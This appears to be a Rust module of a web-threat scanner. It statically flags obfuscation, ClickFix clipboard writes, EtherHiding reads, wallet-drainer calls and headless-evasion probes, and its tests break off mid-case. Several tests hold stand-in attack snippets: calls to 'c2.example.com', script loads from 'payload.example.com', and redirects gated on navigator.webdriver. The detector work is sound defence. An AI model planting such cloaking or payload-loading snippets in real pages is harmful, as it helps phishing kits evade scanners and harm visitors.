use base64::Engine;
use oxc_allocator::Allocator;
use oxc_ast::ast::*;
use oxc_ast_visit::{walk, Visit};
use oxc_parser::Parser;
use oxc_span::SourceType;
use regex::Regex;
use std::sync::OnceLock;
use tracing::debug;

use crate::threat::{CodeLocation, DecodedString, DomMutation, JsFlag, NetworkCall, ThreatReport};

/// Run static analysis on a JS source string and append findings to `report`.
/// Never executes the script.
pub fn analyse(source: &str, source_name: &str, report: &mut ThreatReport) {
    let allocator = Allocator::default();
    let source_type = SourceType::default().with_script(true);
    let result = Parser::new(&allocator, source, source_type).parse();

    if result.diagnostics.has_errors() {
        debug!(
            "{}: {} parse error(s) — continuing analysis on partial AST",
            source_name,
            result.diagnostics.errors().count()
        );
    }

    // Pre-scan: detect navigator.userAgent presence for webdriver suppression logic.
    let has_user_agent_check = source.contains("navigator.userAgent");

    // EtherHiding (ClearFake — G4): a read-only on-chain `eth_call` with a contract
    // address and NO user wallet is the ClearFake stage-2 retrieval. Legitimate
    // dApps read through the visitor's injected wallet (window.ethereum); an
    // anonymous public-node eth_call does not occur on a benign page. Flagged
    // MEDIUM; the Python scorer escalates when paired with a delivery lure. This
    // runs on re-analysed deobfuscated / decoded / rendered script too, so it
    // catches obfuscated ClearFake loaders post-deobfuscation at render time.
    if source.contains("eth_call")
        && !source.contains("window.ethereum")
        && !source.contains("eth_requestAccounts")
        && !source.contains("eth_sendTransaction")
        && !source.contains("personal_sign")
        && !source.contains("eth_signTypedData")
        && has_contract_address(source)
    {
        report.add_js_flag(JsFlag::EtherHidingRead);
    }

    // Ghost code (EvilTokens — G4): the page body is delivered as an AES-GCM blob
    // decrypted client-side with the WebCrypto API and injected into the DOM. The
    // bootstrap loader is plaintext (only the body is encrypted), so this static
    // source check works even though the JS-disabled render never decrypts it.
    // Requires the WebCrypto AES-GCM decrypt + a DOM-HTML sink + a blob source so it
    // does not fire on benign WebCrypto use (e.g. E2E message decrypt to textContent).
    if (source.contains("crypto.subtle.decrypt") || source.contains("crypto.subtle.importKey"))
        && source.contains("AES-GCM")
        && (source.contains(".innerHTML")
            || source.contains(".outerHTML")
            || source.contains("insertAdjacentHTML")
            || source.contains("document.write"))
        && (source.contains("fetch(")
            || source.contains("XMLHttpRequest")
            || source.contains("atob("))
    {
        report.add_js_flag(JsFlag::ClientSideDecryptedPage);
    }

    let mut visitor = SecurityVisitor {
        report,
        source_name: source_name.to_string(),
        source: source.to_string(),
        has_user_agent_check,
    };
    visitor.visit_program(&result.program);
}

struct SecurityVisitor<'r> {
    report: &'r mut ThreatReport,
    source_name: String,
    source: String,
    /// True when navigator.userAgent appears anywhere in the source.
    /// Used to suppress webdriver probes that are part of a bot-UA AND-chain
    /// (Framer URL-parameter-preservation pattern) rather than standalone cloaking gates.
    has_user_agent_check: bool,
}

impl SecurityVisitor<'_> {
    fn loc(&self, byte_offset: u32) -> CodeLocation {
        CodeLocation {
            source: self.source_name.clone(),
            line: byte_offset,
            col: 0,
        }
    }

    fn source_snippet(&self, start: u32, end: u32) -> String {
        let s = start as usize;
        let e = (end as usize).min(self.source.len());
        let raw = &self.source[s..e];
        raw.chars().take(200).collect()
    }

    fn check_member_call(&mut self, prop: &str, args: &[Argument], loc: CodeLocation) {
        match prop {
            "write" | "writeln" => {
                self.report.add_js_flag(JsFlag::DocumentWrite(loc));
            }
            "open" => {
                // XMLHttpRequest.open(method, url, ...)
                let url = nth_string_arg(args, 1);
                if url.is_some() {
                    self.report.add_js_flag(JsFlag::NetworkCall(NetworkCall {
                        kind: "xhr.open".into(),
                        url: url.unwrap_or_else(|| "<dynamic>".into()),
                        loc,
                    }));
                }
            }
            "postMessage" => {
                self.report.add_js_flag(JsFlag::PostMessage(loc));
            }
            // navigator.clipboard.writeText(payload) — the modern ClickFix
            // clipboard write API.  The payload string (if a literal) is
            // captured so the threat report can surface it as evidence.
            "writeText" => {
                let payload = first_string_arg(args).unwrap_or_default();
                self.report.add_js_flag(JsFlag::ClipboardWrite {
                    method: "navigator.clipboard.writeText".into(),
                    payload,
                });
            }
            // document.execCommand('copy') — the legacy ClickFix clipboard
            // write path used on older WordPress compromise toolkits.
            "execCommand" => {
                if let Some(cmd) = first_string_arg(args) {
                    if cmd.eq_ignore_ascii_case("copy") {
                        self.report.add_js_flag(JsFlag::ClipboardWrite {
                            method: "document.execCommand(copy)".into(),
                            payload: String::new(),
                        });
                    }
                }
            }
            _ => {}
        }
    }
}

impl<'a> Visit<'a> for SecurityVisitor<'_> {
    // ── Call expressions ──────────────────────────────────────────────────────

    fn visit_call_expression(&mut self, call: &CallExpression<'a>) {
        let loc = self.loc(call.span.start);

        match &call.callee {
            Expression::Identifier(ident) => {
                let name = ident.name.as_str();
                match name {
                    "eval" => {
                        self.report.add_js_flag(JsFlag::EvalCall(loc.clone()));
                        // If argument is a string literal, record it
                        if let Some(Argument::StringLiteral(s)) = call.arguments.first() {
                            self.report.add_js_flag(JsFlag::EvalLiteralArg {
                                value: s.value.as_str().to_string(),
                                loc,
                            });
                        }
                    }
                    "atob" => {
                        if let Some(Argument::StringLiteral(s)) = call.arguments.first() {
                            if let Ok(decoded) = base64_decode(s.value.as_str()) {
                                self.report.add_js_flag(JsFlag::Base64Obfuscation(DecodedString {
                                    method: "base64".into(),
                                    original: s.value.as_str().to_string(),
                                    decoded,
                                    loc,
                                }));
                            }
                        }
                    }
                    "fetch" => {
                        let url = first_string_arg(&call.arguments);
                        self.report.add_js_flag(JsFlag::NetworkCall(NetworkCall {
                            kind: "fetch".into(),
                            url: url.unwrap_or_else(|| "<dynamic>".into()),
                            loc,
                        }));
                    }
                    "setTimeout" | "setInterval" => {
                        if let Some(Argument::StringLiteral(s)) = call.arguments.first() {
                            self.report.add_js_flag(JsFlag::TimerWithString {
                                timer: name.to_string(),
                                code: s.value.as_str().to_string(),
                                loc,
                            });
                        }
                    }
                    _ => {}
                }
            }

            // obj.method() — check for dangerous member calls
            Expression::StaticMemberExpression(member) => {
                let prop = member.property.name.as_str();

                // document.hasFocus() — false in headless. The old comment here claimed
                // it is "exclusively used in anti-bot fingerprinting"; that is the same
                // premise that was falsified twice for navigator.webdriver. Legitimate
                // analytics measure tab focus (visibility/engagement timing), and
                // anti-fraud SDKs read it as one signal among dozens. Cloaking requires
                // the probe to gate what the visitor receives.
                if prop == "hasFocus" {
                    if let Expression::Identifier(obj) = &member.object {
                        if obj.name == "document" {
                            let (technique, detail) = if probe_gates_content(
                                &self.source,
                                call.span.start as usize,
                                call.span.end as usize,
                            ) {
                                ("focus_probe",
                                 "document.hasFocus() called — always false in headless, and gating a content-delivery sink")
                            } else {
                                ("focus_probe_ungated",
                                 "document.hasFocus() called — no content gated on the result")
                            };
                            self.report.add_js_flag(JsFlag::SandboxEvasion {
                                technique: technique.into(),
                                detail: detail.into(),
                                loc: loc.clone(),
                            });
                        }
                    }
                }

                self.check_member_call(prop, &call.arguments, loc);
            }

            // obj["method"]() — dynamic member calls with string key
            Expression::ComputedMemberExpression(member) => {
                if let Expression::StringLiteral(s) = &member.expression {
                    self.check_member_call(s.value.as_str(), &call.arguments, loc);
                }
            }

            // (new Function(code))() — dynamic code generation
            // new Function() with no arguments is a harmless React/framework idiom.
            // new Function("return this") is the standard UMD/polyfill global-object idiom.
            Expression::NewExpression(new_expr) => {
                if let Expression::Identifier(ident) = &new_expr.callee {
                    if ident.name == "Function" && !new_expr.arguments.is_empty() {
                        let arg = last_string_arg(&new_expr.arguments);
                        if !is_benign_function_body(arg.as_deref()) {
                            let snippet = if arg.is_none() {
                                Some(self.source_snippet(call.span.start, call.span.end))
                            } else {
                                None
                            };
                            self.report.add_js_flag(JsFlag::FunctionConstructor { loc, arg, snippet });
                        }
                    }
                }
            }

            _ => {}
        }

        // Recurse into callee and all arguments
        walk::walk_call_expression(self, call);
    }

    // ── new XMLHttpRequest(), new WebSocket(), new Function() ─────────────────

    fn visit_new_expression(&mut self, new_expr: &NewExpression<'a>) {
        let loc = self.loc(new_expr.span.start);

        if let Expression::Identifier(ident) = &new_expr.callee {
            match ident.name.as_str() {
                "Function" if !new_expr.arguments.is_empty() => {
                    let arg = last_string_arg(&new_expr.arguments);
                    if !is_benign_function_body(arg.as_deref()) {
                        let snippet = if arg.is_none() {
                            Some(self.source_snippet(new_expr.span.start, new_expr.span.end))
                        } else {
                            None
                        };
                        self.report.add_js_flag(JsFlag::FunctionConstructor { loc, arg, snippet });
                    }
                }
                "XMLHttpRequest" => {
                    self.report.add_js_flag(JsFlag::NetworkCall(NetworkCall {
                        kind: "XMLHttpRequest".into(),
                        url: "<unknown>".into(),
                        loc,
                    }));
                }
                "WebSocket" => {
                    let url = first_string_arg(&new_expr.arguments);
                    self.report.add_js_flag(JsFlag::WebSocketAttempt(
                        url.unwrap_or_else(|| "<dynamic>".into()),
                    ));
                }
                _ => {}
            }
        }

        walk::walk_new_expression(self, new_expr);
    }

    // ── Assignments to dangerous sinks ────────────────────────────────────────

    fn visit_assignment_expression(&mut self, assign: &AssignmentExpression<'a>) {
        let loc = self.loc(assign.span.start);

        // Match on simple static member targets: a.b = ...
        if let AssignmentTarget::StaticMemberExpression(member) = &assign.left {
            let prop = member.property.name.as_str();
            match prop {
                "innerHTML" | "outerHTML" => {
                    self.report.add_js_flag(JsFlag::DangerousSink(DomMutation {
                        sink: prop.to_string(),
                        loc: loc.clone(),
                    }));
                }
                "href" => {
                    if let Expression::StringLiteral(s) = &assign.right {
                        self.report.add_js_flag(JsFlag::RedirectAttempt(
                            s.value.as_str().to_string(),
                        ));
                    }
                }
                "cookie" => {
                    self.report.add_js_flag(JsFlag::CookieWrite(loc));
                }
                _ => {}
            }
        }

        // Recurse into the right-hand expression
        self.visit_expression(&assign.right);
        // Note: we intentionally don't recurse into assign.left here to
        // avoid visiting the member expression again as a read context.
    }

    // ── Property reads: detect sandbox evasion probes ────────────────────────

    fn visit_static_member_expression(&mut self, expr: &StaticMemberExpression<'a>) {
        let prop = expr.property.name.as_str();

        if let Expression::Identifier(obj) = &expr.object {
            let obj_name = obj.name.as_str();
            let loc = self.loc(expr.span.start);
            // Shared by every probe arm below that asks whether the read gates content.
            let start = expr.span.start as usize;
            let end = expr.span.end as usize;

            match (obj_name, prop) {
                // navigator.webdriver — headless detection property.
                // Suppress when: negated (!navigator.webdriver), in an && chain, AND
                // navigator.userAgent is also accessed in this script — this is the Framer
                // URL-parameter-preservation pattern, not a cloaking gate.
                ("navigator", "webdriver") => {
                    let src = &self.source;
                    let is_negated = start > 0 && src.as_bytes().get(start - 1).copied() == Some(b'!');
                    let window_start = start.saturating_sub(20);
                    let window_end = (end + 20).min(src.len());
                    let has_and_chain = src.get(window_start..window_end).is_some_and(|w| w.contains("&&"));
                    if self.has_user_agent_check && is_negated && has_and_chain {
                        // Framer URL-param preservation: !navigator.webdriver && !botUA — not cloaking.
                    } else if probe_gates_content(src, start, end) {
                        self.report.add_js_flag(JsFlag::SandboxEvasion {
                            technique: "webdriver_check".into(),
                            detail: "navigator.webdriver accessed — headless browser detection \
                                     gating a content-delivery sink"
                                .into(),
                            loc,
                        });
                    } else {
                        // The probe reads the property but no redirect, DOM rewrite, script
                        // injection or fetch sits near it, so no content difference was
                        // observed — bot-detection SDK / framework behaviour, not cloaking.
                        // Context signal only; the Python analyser reached the same split in
                        // engine 2.1.0 (otto.de) but this layer kept emitting HIGH, which is
                        // what mislabelled currys.co.uk (holdout, 2026-08-17).
                        self.report.add_js_flag(JsFlag::SandboxEvasion {
                            technique: "webdriver_check_ungated".into(),
                            detail: "navigator.webdriver accessed — no content gated on the result"
                                .into(),
                            loc,
                        });
                    }
                }
                // window.outerHeight / window.outerWidth — both are 0 in headless.
                ("window", "outerHeight" | "outerWidth") => {
                    self.report.add_js_flag(JsFlag::SandboxEvasion {
                        technique: "screen_dimension_probe".into(),
                        detail: format!("window.{prop} accessed — headless zero-dimension probe"),
                        loc,
                    });
                }
                // navigator.plugins — empty in headless; common anti-bot fingerprint check.
                ("navigator", "plugins") => {
                    self.report.add_js_flag(JsFlag::SandboxEvasion {
                        technique: "plugins_probe".into(),
                        detail: "navigator.plugins accessed — headless plugin-list probe".into(),
                        loc,
                    });
                }
                // window.chrome — undefined in headless Chromium despite the browser being
                // Chrome-based; anti-bot scripts check for its absence to detect scanners.
                // Also read by ordinary feature detection (extension-bridge probes,
                // Chrome-only API shims), so the cloaking claim needs a gated sink.
                ("window", "chrome") => {
                    let (technique, detail) = if probe_gates_content(&self.source, start, end) {
                        ("chrome_runtime_probe",
                         "window.chrome accessed — undefined in headless, and gating a content-delivery sink")
                    } else {
                        ("chrome_runtime_probe_ungated",
                         "window.chrome accessed — no content gated on the result")
                    };
                    self.report.add_js_flag(JsFlag::SandboxEvasion {
                        technique: technique.into(), detail: detail.into(), loc,
                    });
                }
                // chrome.runtime — accessed without the window. prefix. The old comment
                // called this a "near-exclusive indicator … no legitimate page content
                // reads this"; extension-aware pages and web-store integrations do.
                ("chrome", "runtime") => {
                    let (technique, detail) = if probe_gates_content(&self.source, start, end) {
                        ("chrome_runtime_probe",
                         "chrome.runtime accessed — absent in headless, and gating a content-delivery sink")
                    } else {
                        ("chrome_runtime_probe_ungated",
                         "chrome.runtime accessed — no content gated on the result")
                    };
                    self.report.add_js_flag(JsFlag::SandboxEvasion {
                        technique: technique.into(), detail: detail.into(), loc,
                    });
                }
                // navigator.languages — empty in headless. Kept ungated but demoted to LOW
                // in the severity table: the Python analyser counts this property as
                // evidence that a nearby probe belongs to a legitimate fingerprinting SDK
                // (js_analyser `_check_webdriver_probe`), so flagging it as evasion here
                // made the two layers contradict each other on the same observation.
                ("navigator", "languages") => {
                    self.report.add_js_flag(JsFlag::SandboxEvasion {
                        technique: "languages_probe".into(),
                        detail: "navigator.languages accessed — locale list; also a routine i18n and fingerprinting-SDK read".into(),
                        loc,
                    });
                }
                // Notification.permission — differs in headless. "No legitimate production
                // use" was wrong: every site that asks to send web-push reads this first
                // to decide whether to show its opt-in prompt.
                ("Notification", "permission") => {
                    let (technique, detail) = if probe_gates_content(&self.source, start, end) {
                        ("notification_probe",
                         "Notification.permission accessed — differs in headless, and gating a content-delivery sink")
                    } else {
                        ("notification_probe_ungated",
                         "Notification.permission accessed — no content gated on the result (ordinary web-push opt-in check)")
                    };
                    self.report.add_js_flag(JsFlag::SandboxEvasion {
                        technique: technique.into(), detail: detail.into(), loc,
                    });
                }
                // navigator.deviceMemory / navigator.hardwareConcurrency — undefined in
                // headless. Demoted to LOW in the severity table rather than gated: these
                // are the SAME properties the Python analyser counts as evidence that a
                // nearby probe belongs to a legitimate anti-fraud SDK, and they are also
                // read for ordinary capability tuning (worker-pool sizing, video quality).
                // A HIGH here contradicted the engine's own reading of the same fact.
                ("navigator", "deviceMemory" | "hardwareConcurrency") => {
                    self.report.add_js_flag(JsFlag::SandboxEvasion {
                        technique: "hardware_fingerprint_probe".into(),
                        detail: format!("navigator.{prop} accessed — device capability read; also used for worker-pool sizing and media-quality selection"),
                        loc,
                    });
                }
                _ => {}
            }
        }

        walk::walk_static_member_expression(self, expr);
    }

    // ── String literals: detect hex-escape obfuscation & headless strings ─────

    fn visit_string_literal(&mut self, lit: &StringLiteral<'a>) {
        let val = lit.value.as_str();

        // Hex-escape obfuscation
        if val.len() > 20 && looks_hex_obfuscated(val) {
            let decoded = decode_hex_escapes(val);
            self.report.add_js_flag(JsFlag::HexObfuscation(DecodedString {
                method: "hex-escape".into(),
                original: val.chars().take(80).collect(),
                decoded,
                loc: self.loc(lit.span.start),
            }));
        }

        // Headless browser / automation tool identifiers in string literals.
        // These appear in navigator.userAgent comparisons and property checks.
        // Keep this list tight — false positives destroy analyst trust.
        const HEADLESS_MARKERS: &[&str] = &[
            "HeadlessChrome",
            "PhantomJS",
            "$cdc_",        // Selenium chromedriver DOM marker
            "__nightmare",  // Nightmare.js global
            "_phantom",     // PhantomJS legacy global
        ];
        for &marker in HEADLESS_MARKERS {
            if val.contains(marker) {
                let snippet: String = val.chars().take(80).collect();
                self.report.add_js_flag(JsFlag::SandboxEvasion {
                    technique: "headless_string_probe".into(),
                    detail: format!("string {:?} contains headless marker {:?}", snippet, marker),
                    loc: self.loc(lit.span.start),
                });
                break; // one flag per literal is enough
            }
        }

        // WebGL canvas fingerprinting — used by phishing kits (Tycoon2FA, others) to
        // detect automated analysis before serving the phishing page.
        // WEBGL_debug_renderer_info exposes GPU vendor/renderer strings, which differ
        // between real browsers and headless Chromium.
        //
        // The previous claim here — "no legitimate page functionality requires this
        // extension; it appears exclusively in fingerprinting/bot-detection code" —
        // argues against itself: bot-detection code is exactly what every commercial
        // anti-fraud SDK ships, and WebGL renderer strings are also read by games and
        // 3D/mapping libraries to pick a quality tier or work around driver bugs. Gated
        // like the rest of the family: HIGH only when the read gates delivered content.
        const CANVAS_FINGERPRINT_MARKERS: &[&str] = &[
            "WEBGL_debug_renderer_info",
            "UNMASKED_RENDERER_WEBGL",
            "UNMASKED_VENDOR_WEBGL",
        ];
        for &marker in CANVAS_FINGERPRINT_MARKERS {
            if val.contains(marker) {
                let gated = probe_gates_content(
                    &self.source,
                    lit.span.start as usize,
                    lit.span.end as usize,
                );
                let (technique, detail) = if gated {
                    ("canvas_fingerprint_probe", format!(
                        "WebGL fingerprinting string {:?} — GPU identifier read gating a content-delivery sink",
                        marker))
                } else {
                    ("canvas_fingerprint_probe_ungated", format!(
                        "WebGL fingerprinting string {:?} — GPU identifier read; no content gated on the result",
                        marker))
                };
                self.report.add_js_flag(JsFlag::SandboxEvasion {
                    technique: technique.into(),
                    detail,
                    loc: self.loc(lit.span.start),
                });
                break;
            }
        }

        // Crypto-wallet RPC method strings — the core action of a Web3 wallet
        // drainer. These exact strings have no benign use outside wallet/dApp
        // interaction, so they are a strong signal once they surface (especially
        // in deobfuscated code re-analysed after Tier-0/Tier-2). (Phase 4)
        const WALLET_RPC_METHODS: &[&str] = &[
            "eth_sendTransaction",
            "eth_signTypedData",
            "eth_signTypedData_v4",
            "eth_sign",
            "personal_sign",
            "wallet_requestPermissions",
        ];
        for &m in WALLET_RPC_METHODS {
            if val == m {
                self.report.add_js_flag(JsFlag::CryptoWalletApi { method: m.to_string() });
                break;
            }
        }

        // StringLiteral has no children — no walk needed.
    }
}

// ── Utility functions ─────────────────────────────────────────────────────────

/// Extract the string value of the first argument if it's a string literal.
fn first_string_arg(args: &[Argument]) -> Option<String> {
    nth_string_arg(args, 0)
}

/// Returns true for known-benign `new Function(body)` bodies that should not fire.
/// These are standard UMD / polyfill idioms present on virtually every complex site.
fn is_benign_function_body(body: Option<&str>) -> bool {
    match body {
        // new Function("return this") — standard way to get the global object in strict mode.
        // Used by Babel helpers, core-js, UMD wrappers, etc.
        Some(b) if b.trim() == "return this" => true,
        _ => false,
    }
}

/// Extract the string value of the last argument — used for `new Function([p,] body)`.
fn last_string_arg(args: &[Argument]) -> Option<String> {
    args.last().and_then(|a| {
        if let Argument::StringLiteral(s) = a {
            Some(s.value.as_str().to_string())
        } else {
            None
        }
    })
}

/// Extract the string value of the nth argument if it's a string literal.
fn nth_string_arg(args: &[Argument], n: usize) -> Option<String> {
    args.get(n).and_then(|a| {
        if let Argument::StringLiteral(s) = a {
            Some(s.value.as_str().to_string())
        } else {
            None
        }
    })
}

fn base64_decode(s: &str) -> Result<String, ()> {
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(s)
        .map_err(|_| ())?;
    String::from_utf8(bytes).map_err(|_| ())
}

/// True if `s` contains an Ethereum/BSC contract address literal: `0x` followed
/// by exactly 40 hex digits (not part of a longer hex run).
fn has_contract_address(s: &str) -> bool {
    let b = s.as_bytes();
    let n = b.len();
    let mut i = 0usize;
    while i + 42 <= n {
        if b[i] == b'0' && (b[i + 1] == b'x' || b[i + 1] == b'X') {
            let run_is_hex = b[i + 2..i + 42].iter().all(u8::is_ascii_hexdigit);
            let prev_ok = i == 0 || !b[i - 1].is_ascii_hexdigit();
            let next_ok = i + 42 >= n || !b[i + 42].is_ascii_hexdigit();
            if run_is_hex && prev_ok && next_ok {
                return true;
            }
        }
        i += 1;
    }
    false
}

fn looks_hex_obfuscated(s: &str) -> bool {
    let hex_count = s.matches("\\x").count();
    hex_count > 5 && (hex_count * 4 * 100 / s.len()) > 30
}

fn decode_hex_escapes(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' && chars.peek() == Some(&'x') {
            chars.next(); // consume 'x'
            let h1 = chars.next().unwrap_or('0');
            let h2 = chars.next().unwrap_or('0');
            if let Ok(byte) = u8::from_str_radix(&format!("{h1}{h2}"), 16) {
                result.push(byte as char);
                continue;
            }
        }
        result.push(c);
    }
    result
}

/// Bytes searched either side of a `navigator.webdriver` read for a content-delivery
/// sink. Mirrors the ±700-char window used by the Python analyser.
const PROBE_GATE_WINDOW: usize = 700;

/// True when a content-delivery sink sits near the `start..end` span in `src`.
///
/// Mirrors `_gates_content` in `backend/scanner/modules/js_analyser.py` — the two
/// layers must agree on what "the probe changes what the visitor receives" means.
/// Reading `navigator.webdriver` is not evasion by itself: bot-detection vendors,
/// CAPTCHA site-key selection and framework lazy-init all read it without altering a
/// byte of delivered content. The cloaking claim requires a sink the probe can gate.
///
/// Widening this set makes the result MORE often true, which *preserves* the HIGH on
/// real cloakers — the safe direction for the downgrade this feeds.
fn probe_gates_content(src: &str, start: usize, end: usize) -> bool {
    static GATE_RE: OnceLock<Regex> = OnceLock::new();
    let re = GATE_RE.get_or_init(|| {
        // A navigation is a WRITE to location, not a read of it. Ported from the Python
        // `_gates_content` narrowing (engine 2.1.48): the old alternation accepted a bare
        // `location.href` / `window.location` token anywhere in the window, so code that
        // merely READS the current URL satisfied "gates content delivery" — the finding's
        // entire claim. ethereum.org's Matomo helper returns "webdriver"/"human" for an
        // analytics dimension while `window.location.href.split(...)` three lines away
        // builds the tracked URL; nothing is gated and the page is byte-identical for a
        // bot and a human, yet it scored HIGH.
        //
        // `=[^=]` excludes `==`; every other comparison and compound operator is already
        // excluded because `\s*=` cannot reach across a non-whitespace operator char
        // (`!=`, `>=`, `+=` …). Rust's regex crate has no lookaround, hence the trailing
        // char class rather than the Python side's lookbehind — same effect.
        //
        // MUST be kept in step with `_check_webdriver_probe._gates_content` in
        // backend/scanner/modules/js_analyser.py. These two layers drifted once before
        // (the Python HIGH/LOW split shipped in 2.1.0 and reached Carapace only in
        // 2.1.36, mislabelling currys.co.uk in between) — change both together.
        Regex::new(concat!(
            r#"(?i)(?:(?:window|document|top|self|parent)\s*\.\s*)?location"#,
            r#"(?:\s*\.\s*href)?\s*=[^=]"#,
            r#"|(?:(?:window|document|top|self|parent)\s*\.\s*)?location\s*\.\s*(?:replace|assign)\s*\("#,
            r#"|document\s*\.\s*write|\.\s*innerHTML\s*="#,
            r#"|\bfetch\s*\(|XMLHttpRequest|window\s*\.\s*open\s*\("#,
            r#"|createElement\s*\(\s*["']script["']|\.\s*src\s*=|\beval\s*\(|\bimport\s*\("#,
        ))
        .expect("static webdriver content-gate regex")
    });
    // Byte offsets from the AST are not guaranteed to land on char boundaries once the
    // window is widened, and slicing a str off-boundary panics.
    let mut lo = start.saturating_sub(PROBE_GATE_WINDOW);
    while lo > 0 && !src.is_char_boundary(lo) {
        lo -= 1;
    }
    let mut hi = end.saturating_add(PROBE_GATE_WINDOW).min(src.len());
    while hi < src.len() && !src.is_char_boundary(hi) {
        hi += 1;
    }
    src.get(lo..hi).is_some_and(|w| re.is_match(w))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::threat::{Severity, ThreatReport};

    fn run(src: &str) -> ThreatReport {
        let mut report = ThreatReport::new("https://test.example");
        analyse(src, "test.js", &mut report);
        report
    }

    #[test]
    fn detects_eval() {
        let report = run("eval('alert(1)')");
        assert!(report.js_flags().iter().any(|f| matches!(f, JsFlag::EvalCall(_))));
    }

    #[test]
    fn detects_fetch() {
        let report = run(r#"fetch("https://c2.example.com/data")"#);
        assert!(report.js_flags().iter().any(|f| matches!(f, JsFlag::NetworkCall(_))));
    }

    #[test]
    fn detects_base64() {
        // atob("YWxlcnQoMSk=") decodes to alert(1)
        let report = run(r#"atob("YWxlcnQoMSk=")"#);
        assert!(report.js_flags().iter().any(|f| matches!(f, JsFlag::Base64Obfuscation(_))));
    }

    #[test]
    fn detects_inner_html() {
        let report = run("document.body.innerHTML = '<b>hi</b>'");
        assert!(report.js_flags().iter().any(|f| matches!(f, JsFlag::DangerousSink(_))));
    }

    #[test]
    fn detects_websocket() {
        let report = run(r#"new WebSocket("wss://c2.example.com")"#);
        assert!(report.js_flags().iter().any(|f| matches!(f, JsFlag::WebSocketAttempt(_))));
    }

    #[test]
    fn detects_function_constructor() {
        let report = run(r#"new Function("return 1")"#);
        assert!(report.js_flags().iter().any(|f| matches!(f, JsFlag::FunctionConstructor { .. })));
    }

    #[test]
    fn detects_navigator_webdriver() {
        let report = run("if (navigator.webdriver) { window.location = 'https://c2.example.com'; }");
        assert!(report.js_flags().iter().any(|f| matches!(
            f, JsFlag::SandboxEvasion { technique, .. } if technique == "webdriver_check"
        )));
    }

    /// Positive controls for the ungated downgrade: a probe that gates ANY
    /// content-delivery sink must keep the cloaking technique. Written before the
    /// downgrade landed — the whole risk of that change is deleting these detections.
    #[test]
    fn webdriver_gating_content_stays_cloaking() {
        for src in [
            "if (navigator.webdriver) { window.location.href = 'https://c2.example.com'; }",
            "if (navigator.webdriver) { document.write('<h1>nothing here</h1>'); }",
            "if (!navigator.webdriver) { fetch('https://payload.example.com/stage2'); }",
            "var bot = navigator.webdriver;\nif (!bot) { document.body.innerHTML = payload; }",
            "if (navigator.webdriver) { return; }\nvar s = document.createElement('script');\n\
             s.src = 'https://payload.example.com/x.js'; document.body.appendChild(s);",
            "if (navigator.webdriver) { location.replace('https://decoy.example.com'); }",
        ] {
            let report = run(src);
            assert!(
                report.js_flags().iter().any(|f| matches!(
                    f, JsFlag::SandboxEvasion { technique, .. } if technique == "webdriver_check"
                )),
                "content-gating probe lost its cloaking technique: {src}"
            );
        }
    }

    /// The FP class this split exists for: bot-detection SDKs, CAPTCHA site-key
    /// selection and framework lazy-init read the property and deliver identical
    /// content. Flagged as context (LOW), never as cloaking.
    #[test]
    fn webdriver_gating_nothing_is_ungated() {
        for src in [
            // otto.de's web-component runtime — skips lazy init under automation.
            "o && je[1] && !navigator.wd && (n = _e(n, je));\nvar q = navigator.webdriver;",
            "var fp = { webdriver: navigator.webdriver, lang: navigator.language };",
            "if (navigator.webdriver) { console.log('automation'); }",
        ] {
            let report = run(src);
            assert!(
                report.js_flags().iter().any(|f| matches!(
                    f, JsFlag::SandboxEvasion { technique, .. }
                    if technique == "webdriver_check_ungated"
                )),
                "ungated probe was not downgraded: {src}"
            );
            assert!(
                !report.js_flags().iter().any(|f| matches!(
                    f, JsFlag::SandboxEvasion { technique, .. } if technique == "webdriver_check"
                )),
                "ungated probe still emitted the cloaking technique: {src}"
            );
        }
    }

    /// The rest of the sandbox-evasion family, gated the same way (2026-08-18 audit).
    /// Positive controls: each probe must keep its cloaking technique when it gates a
    /// content-delivery sink. Written before the downgrade — deleting these is the whole
    /// risk of the change.
    #[test]
    fn gating_probes_keep_their_cloaking_technique() {
        for (src, want) in [
            ("if (document.hasFocus()) { window.location = 'https://c2.example.com'; }",
             "focus_probe"),
            ("if (!window.chrome) { document.write('<h1>nothing</h1>'); }",
             "chrome_runtime_probe"),
            ("if (!chrome.runtime) { fetch('https://payload.example.com/s2'); }",
             "chrome_runtime_probe"),
            ("if (Notification.permission === 'denied') { location.replace('https://c2.example.com'); }",
             "notification_probe"),
            ("var e = gl.getExtension('WEBGL_debug_renderer_info');\n\
              if (!e) { document.body.innerHTML = payload; }",
             "canvas_fingerprint_probe"),
        ] {
            let report = run(src);
            assert!(
                report.js_flags().iter().any(|f| matches!(
                    f, JsFlag::SandboxEvasion { technique, .. } if technique == want
                )),
                "gating probe lost its cloaking technique ({want}): {src}"
            );
        }
    }

    /// Reading `location` is not gating content. The Matomo shape from ethereum.org,
    /// ported alongside the Python narrowing (engine 2.1.48): a probe whose result feeds
    /// an analytics dimension, with `location.href` read nearby to build a tracked URL.
    /// Nothing is delivered differently, so this must be ungated (LOW).
    #[test]
    fn reading_location_is_not_a_content_gate() {
        let src = "function detectAutomation(){ return navigator.webdriver ? 'webdriver' : 'human'; }\n\
                   var dim = detectAutomation();\n\
                   var tracked = window.location.href.split(/[?#]/)[0];\n\
                   _paq.push(['setCustomDimension', 3, dim]);\n\
                   _paq.push(['setCustomUrl', tracked]);";
        let report = run(src);
        assert!(
            report.js_flags().iter().any(|f| matches!(
                f, JsFlag::SandboxEvasion { technique, .. } if technique == "webdriver_check_ungated"
            )),
            "a location READ must not count as gating content"
        );
        // And an equality test on the current URL is still a read, not a navigation.
        let eq = "if (navigator.webdriver) { flag = (location.href == canonical); }";
        assert!(
            run(eq).js_flags().iter().any(|f| matches!(
                f, JsFlag::SandboxEvasion { technique, .. } if technique == "webdriver_check_ungated"
            )),
            "`location.href ==` is a comparison, not an assignment"
        );
    }

    /// The FP direction: the same probes with nothing gated on the result. These are the
    /// shapes commercial anti-fraud SDKs, analytics and ordinary capability detection
    /// produce — the premise "no legitimate site reads this" is false for every one.
    #[test]
    fn ungated_probes_are_downgraded() {
        for (src, want) in [
            ("var focused = document.hasFocus();\ntrack('engagement', focused);",
             "focus_probe_ungated"),
            ("var isChrome = !!window.chrome;\nprofile.browser = isChrome;",
             "chrome_runtime_probe_ungated"),
            ("if (Notification.permission === 'default') { showOptInBanner(); }",
             "notification_probe_ungated"),
            ("var dbg = gl.getExtension('WEBGL_debug_renderer_info');\nquality = tierFor(dbg);",
             "canvas_fingerprint_probe_ungated"),
        ] {
